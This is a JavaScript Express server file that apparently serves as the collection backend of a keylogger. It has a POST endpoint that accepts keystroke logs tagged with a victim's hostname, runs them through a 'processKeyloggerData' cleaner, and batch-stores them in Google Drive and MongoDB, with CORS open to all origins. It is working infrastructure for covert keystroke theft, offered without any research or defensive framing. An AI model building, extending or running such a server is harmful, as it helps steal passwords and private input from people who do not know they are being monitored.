import express from "express";
import cors from 'cors'
import { SERVER_CONFIG, configValues } from './config.js';
import BatchProcessor from "./util/batchProcessor.js";
import {processKeyloggerData} from "./util/cleanRawLogs.js";
import connectDB from "./util/database.js";
import userRoutes from './router/userRoutes.js';
import driveRoutes from './router/driveRoutes.js';

export const app = express();

// Middleware with increased body size limit
app.use(express.json({ limit: SERVER_CONFIG.bodyLimit }));
app.use(express.urlencoded({ extended: true, limit: SERVER_CONFIG.bodyLimit }));

// allow all origins
app.use(cors());

// The Google Drive service is initialized inside this batchProcessor's constructor automatically
const batchProcessor = new BatchProcessor();

// check backend working
app.get("/", (req, res) => {
    return res.status(200).json({
        message: "I am coming from backend",
        success: true
    });
});

app.post("/", async (req, res) => {
    console.log(`request to save logs came`)
    const { logs, hostname } = req.body;
    console.log(`request to save logs came by ${hostname} with ${logs.length} logs`)
    
    if (!Array.isArray(logs) || !hostname) {
        return res.status(400).json({ success: false, message: "Missing logs array or hostname" });
    }
    
    try {
        // Preprocess logs before batch processing
        const processedLogs = processKeyloggerData(logs);
        // Always use batch processing for consistency and reliability
        const result = await batchProcessor.processLargeDataset(hostname, processedLogs);
        
        res.send({ 
            success: true, 
            message: "Logs processed successfully", 
            result: result, 
            config: configValues,
        });
    } catch (err) {
        console.error('Error processing logs:', err);
        res.status(500).json({ 
            success: false, 
            message: "Server error",
            config: configValues,
        });
    }
});

app.use('/api/users', userRoutes);
app.use('/api/drive', driveRoutes);

// Start the server
app.listen(SERVER_CONFIG.port, async () => {
    try {
        // connect to mongoDB
        await connectDB();
        // Server UP and running smooth
        console.log(`Server running at port ${SERVER_CONFIG.port}`);
    } catch (err) {
        console.error('Failed to start server:', err);
        process.exit(1);
    }    
});